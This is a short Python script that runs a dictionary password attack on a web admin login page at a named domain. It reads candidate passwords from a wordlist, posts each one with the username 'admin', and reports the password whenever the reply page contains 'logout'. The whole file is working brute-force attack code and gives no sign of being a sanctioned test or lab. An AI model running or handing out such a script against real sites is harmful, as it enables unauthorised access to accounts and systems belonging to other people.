import requests

with open("wordlist.txt") as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"user": "admin", "password": word}
        response = requests.post("http://www.bancocn.com/admin/index.php", data=data)
        if "logout" in response.text:
            print("Logged in", word)